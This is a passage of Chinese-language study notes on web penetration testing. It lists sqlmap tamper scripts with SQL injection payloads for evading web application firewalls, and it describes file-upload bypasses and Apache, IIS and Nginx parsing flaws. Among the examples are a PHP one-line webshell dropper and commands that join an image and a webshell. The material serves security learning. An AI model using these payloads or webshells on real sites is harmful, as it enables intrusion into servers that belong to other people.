re.sub(r”\b(\w+)(“, “\g<1>/**/(“, retVal)</1></p></blockquote><p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p><blockquote><p>union select group_concat(table_name)    <strong>to</strong>    union select group_concat/**/(table_name)</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="concat2concatws-py："><a href="#concat2concatws-py：" class="headerlink" title="concat2concatws.py："></a>concat2concatws.py：</h4><blockquote><p>payload = payload.replace(“CONCAT(“, “CONCAT_WS(MID(CHAR(0),0,0),”)</p></blockquote><p>用于过滤了 concat 函数的情况</p><blockquote><p>concat(1,2)    <strong>to</strong>    concat_ws(mid(char(0), 0, 0), 1, 2)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="equaltolike-py："><a href="#equaltolike-py：" class="headerlink" title="equaltolike.py："></a>equaltolike.py：</h4><blockquote><p>retVal = re.sub(r”\s<em>=\s</em>“, “ LIKE “, retVal)</p></blockquote><p>将等号用 like 代替，用于过滤了等号的情况</p><blockquote><p>select <em> from users where id=1    <strong>to</strong>    select </em> from users where id like 1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="escapequotes-py："><a href="#escapequotes-py：" class="headerlink" title="escapequotes.py："></a>escapequotes.py：</h4><blockquote><p>return payload.replace(“‘“, “\’”).replace(‘“‘, ‘\”‘)</p></blockquote><p>将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p><blockquote><p>1’ and 1=1–+    <strong>to</strong>    1\‘ and 1=1–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="greatest-py："><a href="#greatest-py：" class="headerlink" title="greatest.py："></a>greatest.py：</h4><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p><blockquote><p>1 and a&gt;b    <strong>to</strong>    1 and greatest(a,b+1)=a</p></blockquote><p>ALL</p><h4 id="halfversionedmorekeywords-py："><a href="#halfversionedmorekeywords-py：" class="headerlink" title="halfversionedmorekeywords.py："></a>halfversionedmorekeywords.py：</h4><p>在关键字前添加注释，用于过滤了关键字的情况</p><blockquote><p>union select 1,2    <strong>to</strong>    /<em>!0union/</em>!0select 1,2</p></blockquote><p><strong>适用数据库：</strong>MySQL &lt; 5.1</p><h4 id="htmlencode-py："><a href="#htmlencode-py：" class="headerlink" title="htmlencode.py："></a>htmlencode.py：</h4><blockquote><p>return re.sub(r”[^\w]”, lambda match: “&amp;#%d;” % ord(match.group(0)), payload) if payload else payload</p></blockquote><p>从名字就知道是将 payload 进行 html 编码</p><blockquote><p>1’ and 1=1–+    <strong>to</strong>    &#49;&#39;&#32;&#97;&#110;&#100;&#32;&#49;&#61;&#49;&#45;&#45;&#43;</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="ifnull2ifisnull-py："><a href="#ifnull2ifisnull-py：" class="headerlink" title="ifnull2ifisnull.py："></a>ifnull2ifisnull.py：</h4><p>将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况</p><blockquote><p>ifnull(1, 2)    <strong>to</strong>    if(isnull(1), 2, 1)</p></blockquote><p><strong>适用数据库：</strong>MySql</p><h4 id="informationschemacomment-py："><a href="#informationschemacomment-py：" class="headerlink" title="informationschemacomment.py："></a>informationschemacomment.py：</h4><blockquote><p>retVal = re.sub(r”(?i)(information_schema).”, “\g<1>/**/.”, payload)</1></p></blockquote><p>在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况</p><blockquote><p>select table_name from information_schema.tables    <strong>to</strong>    select table_name from information_schema/**/.tables</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="lowercase-py："><a href="#lowercase-py：" class="headerlink" title="lowercase.py："></a>lowercase.py：</h4><p>将 payload 里的大写转为小写</p><blockquote><p>UNION SELECT    <strong>to</strong>    union select</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="modsecurityversioned-py："><a href="#modsecurityversioned-py：" class="headerlink" title="modsecurityversioned.py："></a>modsecurityversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><blockquote><p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!30874and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="modsecurityzeroversioned-py："><a href="#modsecurityzeroversioned-py：" class="headerlink" title="modsecurityzeroversioned.py："></a>modsecurityzeroversioned.py：</h4><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><blockquote><p>1 and 2&gt;1–+    <strong>to</strong>    1 /<em>!00000and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="multiplespaces-py："><a href="#multiplespaces-py：" class="headerlink" title="multiplespaces.py："></a>multiplespaces.py：</h4><p>在关键字周围添加多个空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union         select       1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="nonrecursivereplacement-py："><a href="#nonrecursivereplacement-py：" class="headerlink" title="nonrecursivereplacement.py："></a>nonrecursivereplacement.py：</h4><p>关键字双写，可用于关键字过滤</p><blockquote><p>union select 1,2–+    <strong>to</strong>    uniounionn selecselectt 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="overlongutf8-py："><a href="#overlongutf8-py：" class="headerlink" title="overlongutf8.py："></a>overlongutf8.py：</h4><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><blockquote><p>select field from table where 2&gt;1    <strong>to</strong>    select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="percentage-py："><a href="#percentage-py：" class="headerlink" title="percentage.py："></a>percentage.py：</h4><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><blockquote><p>select <em> from users    <strong>to</strong>    %s%e%l%e%c%t </em> %f%r%o%m %u%s%e%r%s</p></blockquote><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><h4 id="plus2concat-py："><a href="#plus2concat-py：" class="headerlink" title="plus2concat.py："></a>plus2concat.py：</h4><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><blockquote><p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select concat(char(113),char(114),char(115)) from user</p></blockquote><p><strong>适用数据库：</strong>SQL Server 2012+</p><h4 id="plus2fnconcat-py："><a href="#plus2fnconcat-py：" class="headerlink" title="plus2fnconcat.py："></a>plus2fnconcat.py：</h4><p>用 fn concat 来替代加号，和上面类似</p><blockquote><p>select char(13)+char(114)+char(115) from user    <strong>to</strong>    select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p></blockquote><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><h4 id="randomcase-py："><a href="#randomcase-py：" class="headerlink" title="randomcase.py："></a>randomcase.py：</h4><p>将 payload 随机大小写，可用于大小写绕过的情况</p><blockquote><p>union select 1,2–+    <strong>to</strong>    UniOn SElect 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="randomcomments-py："><a href="#randomcomments-py：" class="headerlink" title="randomcomments.py："></a>randomcomments.py：</h4><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><blockquote><p>union select 1,2–+    <strong>to</strong>    un/<strong>/ion sele/</strong>/ct 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="securesphere-py："><a href="#securesphere-py：" class="headerlink" title="securesphere.py："></a>securesphere.py：</h4><blockquote><p>return payload + “ and ‘0having’=’0having’” if payload else payload</p></blockquote><p>在 payload 后面加入字符串，可以自定义</p><blockquote><p>1’ and 1=1    <strong>to</strong>    1’ and 1=1 ‘0having’=’0having’</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="sp-password-py："><a href="#sp-password-py：" class="headerlink" title="sp_password.py："></a>sp_password.py：</h4><blockquote><p>retVal = “%s%ssp<em>password” % (payload, “– “ if not any(</em> if <em> in payload else None for </em> in (‘#’, “– “)) else “”)</p></blockquote><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><blockquote><p>1’  and 1=1–+    <strong>to</strong>    1 and 1=1– sp_password</p></blockquote><p><strong>适用数据库：</strong>MSSQL</p><h4 id="space2comment-py："><a href="#space2comment-py：" class="headerlink" title="space2comment.py："></a>space2comment.py：</h4><p>用 /**/ 替代空格，用于空格的绕过</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union/<strong>/select/</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2dash-py："><a href="#space2dash-py：" class="headerlink" title="space2dash.py："></a>space2dash.py：</h4><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+    <strong>to</strong>    union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><h4 id="space2hash-py："><a href="#space2hash-py：" class="headerlink" title="space2hash.py："></a>space2hash.py：</h4><p>和上面类似，不过这儿是用#注释符</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2morecomment-py："><a href="#space2morecomment-py：" class="headerlink" title="space2morecomment.py："></a>space2morecomment.py：</h4><p>将空格用 /<strong>_</strong>/ 替代</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union/<strong>_</strong>/select/<strong>_</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2morehash-py："><a href="#space2morehash-py：" class="headerlink" title="space2morehash.py："></a>space2morehash.py：</h4><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><blockquote><p>space2hash.py：        union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A1,2–+</p><p>space2morehash.py：union select 1,2–+    <strong>to</strong>    union  %23  HSHjsJh  %0A  select  %23  HhjHSJ  %0A%23  HJHJhj  %0A  1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="space2mssqlblank-py："><a href="#space2mssqlblank-py：" class="headerlink" title="space2mssqlblank.py："></a>space2mssqlblank.py：</h4><blockquote><p>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%01select%021,2–+</p></blockquote><p><strong>适用数据库：</strong>SQL Server</p><h4 id="space2mssqlhash-py："><a href="#space2mssqlhash-py：" class="headerlink" title="space2mssqlhash.py："></a>space2mssqlhash.py：</h4><p>用 # 加一个换行符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong>    union%23%0Aselect%23%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MSSQL、MySQL</p><h4 id="space2mysqlblank-py："><a href="#space2mysqlblank-py：" class="headerlink" title="space2mysqlblank.py："></a>space2mysqlblank.py：</h4><blockquote><p>blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p></blockquote><p>用这些随机空白符替换payload中的空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%09select%0D1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2mysqldash-py："><a href="#space2mysqldash-py：" class="headerlink" title="space2mysqldash.py："></a>space2mysqldash.py：</h4><p>用 – 加一个换行符替换空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union–%0Aselect–%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL、MSSQL</p><h4 id="space2plus-py："><a href="#space2plus-py：" class="headerlink" title="space2plus.py："></a>space2plus.py：</h4><p>用 + 替换空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union+select+1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2randomblank-py："><a href="#space2randomblank-py：" class="headerlink" title="space2randomblank.py："></a>space2randomblank.py：</h4><blockquote><p>blanks = (“%09”, “%0A”, “%0C”, “%0D”)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+    <strong>to</strong>    union%09select%0C1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="symboliclogical-py："><a href="#symboliclogical-py：" class="headerlink" title="symboliclogical.py："></a>symboliclogical.py：</h4><blockquote><p>retVal = re.sub(r”(?i)\bAND\b”, “%26%26”, re.sub(r”(?i)\bOR\b”, “%7C%7C”, payload))</p></blockquote><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><blockquote><p>1 and 1=1    <strong>to</strong>    1 %26%26 1=1</p><p>1 or 1=1    <strong>to</strong>    1 %7c%7c 1=1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unionalltounion-py："><a href="#unionalltounion-py：" class="headerlink" title="unionalltounion.py："></a>unionalltounion.py：</h4><blockquote><p>return payload.replace(“UNION ALL SELECT”, “UNION SELECT”) if payload else payload</p></blockquote><p>用 union select 替换union all select</p><blockquote><p>union all select 1,2–+    <strong>to</strong>    union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unmagicquotes-py："><a href="#unmagicquotes-py：" class="headerlink" title="unmagicquotes.py："></a>unmagicquotes.py：</h4><p>用宽字符绕过 GPC addslashes</p><blockquote><p>1‘ and 1=1    <strong>to</strong>    1%df%27 and 1=1–</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="uppercase-py："><a href="#uppercase-py：" class="headerlink" title="uppercase.py："></a>uppercase.py：</h4><p>将 payload 大写</p><blockquote><p>union select    <strong>to</strong>    UNION SELECT</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="varnish-py："><a href="#varnish-py：" class="headerlink" title="varnish.py："></a>varnish.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload</p></blockquote><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><blockquote><p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><p>对不是函数的关键字进行注释</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#    </p></blockquote><p><strong>to</strong>    </p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="versionedmorekeywords-py："><a href="#versionedmorekeywords-py：" class="headerlink" title="versionedmorekeywords.py："></a>versionedmorekeywords.py：</h4><p>注释每个关键字</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="xforwardedfor-py："><a href="#xforwardedfor-py：" class="headerlink" title="xforwardedfor.py："></a>xforwardedfor.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p></blockquote><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p><h2 id="第4章-Web安全原理剖析"><a href="#第4章-Web安全原理剖析" class="headerlink" title="第4章 Web安全原理剖析"></a><strong>第4章 Web安全原理剖析</strong></h2><p>Web渗透的核心技术包括SQL注入﹑XSS攻击﹑CSRF攻击﹑SSRF攻击﹑暴力破解﹑文件上传﹑命令执行漏洞攻击﹑逻辑漏洞攻击﹑XXE漏洞攻击和WAF绕过等。本章依次将这些常见高危漏洞提取出来，从原理到利用，从攻击到防御，一一讲解。</p><p>●    SQL注入漏洞，讨论各种攻击手法，从最明显﹑最简单的方法到一系列高级攻击技巧，包括SQL注入绕过技术；</p><p>●    XSS攻击，讲解了XSS的形成原理﹑三种XSS类型﹑XSS常用语句﹑XSS编码绕过以及任何使用XSS平台测试XSS，最后提出了对XSS漏洞的修复意见；</p><p>以及CSRF漏洞﹑SSRF漏洞﹑XXE漏洞﹑暴力破解漏洞﹑命令执行漏洞﹑文件上传漏洞﹑逻辑漏洞的形成原理﹑漏洞利用﹑代码分析，以及要如何对它们进行修复。</p><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="sql注入中tips"><a href="#sql注入中tips" class="headerlink" title="sql注入中tips"></a>sql注入中tips</h3><p>布尔型注入使用burp爆破以代替手注</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252114_327.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252113_363.png" alt=""></p><p>宽字节注入原因：</p><p>数据库使用GBK，被转义符转义，</p><p>加上%df。反斜杠是%5c,连接再一起%df%5c</p><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><p>id=1</p><p>变为id=MQ%3d%3d</p><p>访问1’即为id=MSc%3d 注入的语句都使用base64编码</p><h3 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h3><p>x-forward-for注入</p><p>代码分析</p><p>php中的getenv()函数用于获取一个环境变量的值，类似于<code>$_server或者$_ENV</code>返回环境变量对应的值，如果环境变量不存在则返回false</p><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>And Order </p><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>anandd绕过and过滤</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>url全编码</p><p>两次url全编码</p><h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><pre><code>/*!and*/</code></pre><h3 id="sql防御"><a href="#sql防御" class="headerlink" title="sql防御"></a>sql防御</h3><p>1.过滤危险字符</p><p>2.使用预编译</p><p>pdo预编译</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>dom xss是基于dom文档对象模型的</p><p>xss绕过编码：js编码，html实体编码，url编码</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="文件后缀绕过"><a href="#文件后缀绕过" class="headerlink" title="文件后缀绕过"></a>文件后缀绕过</h4><h4 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h4><p>有些Apache允许解析其他文件后缀的，例如在http.conf中，如果配置如下代码</p><pre><code>AddType application/x-httpd-php .php .phtml</code></pre><p>所以可以上传一个后缀为phtml的Webshell。</p><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h4 id="文件截断绕过"><a href="#文件截断绕过" class="headerlink" title="文件截断绕过"></a>文件截断绕过</h4><p>截断条件：php版本小于5.3.4 php的magic_quotes_gpc为OFF</p><p>假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</p><p>实际操作：1.php%00.jpg</p><p>选中%00进行url编码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805101116_179.png" alt=""></p><p>或者 test.asp .jpg 去burp hex中20更改00</p><h4 id="服务端检测绕过-文件类型MIME-类型检测"><a href="#服务端检测绕过-文件类型MIME-类型检测" class="headerlink" title="服务端检测绕过(文件类型MIME 类型检测)"></a>服务端检测绕过(文件类型MIME 类型检测)</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071824_866.png" alt=""></p><p>修改Content-Type 为image/jpeg</p><h4 id="服务端验证绕过-文件完整性检测"><a href="#服务端验证绕过-文件完整性检测" class="headerlink" title="服务端验证绕过(文件完整性检测)"></a>服务端验证绕过(文件完整性检测)</h4><p>- 文件头检测 主要是在文件内容开始设置好图片文件的幻数 要绕过 jpg 文件检测就要在文件开头写上下图的值</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808281727_203.png" alt=""></p><p>在php中还存在一种类似的文件上传绕过，php函数getimagesize(可以获取图片的宽高等信息，如果上传的不是图片文件，那么getimagesize()就获取不到信息，则不允许上传。</p><p>但是可以讲一个图片和一个webshell合并为一个文件，例如使用以下命令，</p><p>cat image.png webshell.php &gt; image.php</p><p>copy 1.jpg/b+lubr.php/a 1lubr.jpg</p><p>此时使用getimagesize()就获取到图片信息，且webshell的后缀是php也能被Apache解析为脚本文件</p><h4 id="服务端检测绕过-文件扩展名检测"><a href="#服务端检测绕过-文件扩展名检测" class="headerlink" title="服务端检测绕过(文件扩展名检测)"></a>服务端检测绕过(文件扩展名检测)</h4><ul><li><p>黑名单检测</p><ol><li><p>文件名大小写绕过<br> 用像 AsP，pHp 之类的文件名绕过黑名单检测</p></li><li><p>名单列表绕过<br> 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类.还有php2、php3、</p></li><li><p>特殊文件名绕过<br> 比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式<br> 在 windows是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会<br> 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性。</p></li><li><p>0x00 截断绕过</p><p> 截断条件：php版本小于5.3.4 php的magic_quotes_gpc为OFF</p><p> 假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00) 而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</p><p> 实际操作：1.php%00.</p><p> jpg</p><p> 选中%00进行url编码</p><p> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805101116_179.png" alt=""></p><p> 或者 test.asp .jpg 去burp hex中20更改00</p></li><li><p>htaccess 文件攻击<br> 配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</p><p> 该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p><pre><code> &lt;FilesMatch &quot;_php.gif&quot;&gt;  SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code></pre><p> 保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”_php.gif”字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="external">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如a_php.gif，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有.htaccess文件，那么我们可以上传.htaccess文件覆盖掉原来的文件。</p></li><li><p>解析调用/漏洞绕过<br> 这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞</p></li></ol></li><li><p>白名单检测</p></li><li><p>.htaccess 文件攻击</p></li></ul><h4 id="服务端检测绕过-文件内容检测"><a href="#服务端检测绕过-文件内容检测" class="headerlink" title="服务端检测绕过(文件内容检测)"></a>服务端检测绕过(文件内容检测)</h4><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804071849_233.png" alt=""></p><ul><li><p>文件幻数检测</p><p>  JPG ： FF D8 FF E0 00 10 4A 46 49 46<br>  GIF ： 47 49 46 38 39 61 (GIF89a)<br>  PNG： 89 50 4E 47</p></li><li><p>文件相关信息检测</p><p>  图像文件相关信息检测常用的就是 getimagesize()函数</p></li></ul><pre><code>只需要把文件头部分伪造好就 ok GIF89a</code></pre><p>  &lt;?php phpinfo();?&gt;</p><ul><li><p>文件加载检测</p><p>  绕过方法：<br>  针对渲染加载测试：代码注入绕过<br>  针对二次渲染测试：攻击文件加载器</p></li></ul><h4 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h4><h5 id="Apache-解析漏洞-1"><a href="#Apache-解析漏洞-1" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h5><ul><li>解析：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。</li><li>描述：若一个文件名<code>abc.x1.x2.x3</code>，<code>Apache</code>会从<code>x3</code>开始解析，如果<code>x3</code>不是一个能解析的扩展名，就往前解析<code>x2</code>以此往复，直到能遇到一个能解析的文件名为止</li></ul><h5 id="IIS-解析漏洞"><a href="#IIS-解析漏洞" class="headerlink" title="IIS 解析漏洞"></a>IIS 解析漏洞</h5><p>解析：<code>test.asp/jkl</code>,<code>IIS</code>的某些版本中会直接当成<code>asp</code>来解析;<code>test.asp;jkl</code>,<code>IIS</code>某些版本也会按照<code>asp</code>来解析；<code>任意文件名/任意文件名.php</code>，<code>IIS</code>某些版本会直接当<code>php</code>来解析</p><p>描述：</p><h5 id="IIS5-x-6-0解析漏洞"><a href="#IIS5-x-6-0解析漏洞" class="headerlink" title="IIS5.x/6.0解析漏洞"></a>IIS5.x/6.0解析漏洞</h5><p>1.<code>IIS6.0</code>在解析<code>asp</code>时有两个解析漏洞，一个是如果任意目录名包含<code>.asp</code>字符串，那么这个目录下的所有文件都会按照<code>asp</code>去解析，另一个是文件名中含有<code>asp;</code>就会优先当作<code>asp</code>来解析</p><p><strong>利用方法有两种</strong>:</p><pre><code>1. 畸形目录解析/xxxx.asp/xxx.jpg2. 分号文件解析test.asp;.jpg</code></pre><ul><li>第1种是因为xxx.jpg图片文件在某个以.asp结尾的目录下面，而被IIS当成可执行文件来解析</li><li>第2种虽然以.jpg结尾，但IIS 解析时忽略了分号”;”后面的部分，当成了test.asp文件来解析</li></ul><p>IIS7.0/7,5</p><p>在默认Fast-CGI开启状况下 </p><p>2.<code>IIS7.0/7.5</code>对php解析有类似<code>Nginx</code>的解析漏洞只要对任意文件名在url后面追加上字符串<code>/任意文件名.php</code>就会按照php去解析</p><p>上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p><h5 id="Nginx-解析漏洞"><a href="#Nginx-解析漏洞" class="headerlink" title="Nginx 解析漏洞"></a>Nginx 解析漏洞</h5><ul><li><p>解析：</p><ol><li><p>任意文件名/任意文件名.php</p><p> 将shell语句，如</p><pre><code> &lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p> 写在文本xx.txt中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片xx.jpg后</p><pre><code> copy xx.jpg/b + xx.txt/a test.jpg</code></pre><p> 上传test.jpg，然后访问test.jpg/.php或test.jpg/abc.php当前目录下就会生成一句话木马 shell.php</p></li><li><p>任意文件名%00.php都当作php来解析</p><pre><code> xx.jpg%00.php</code></pre></li></ol></li><li><p>描述：例如原文件名test.jpg但内容包含php一句话添加为test.jpg/x.php来进行解析攻击低版本可以子任意文件名后添加%00.php进行截断攻击</p></li><li><p>对应版本：</p><p>  nginx 0.5.* [Success]</p><p>  nginx 0.6.* [Success]</p><p>  nginx 0.7 &lt;= 0.7.65 [Success]</p><p>  nginx 0.8 &lt;= 0.8.37 [Success]</p></li></ul><h4 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" 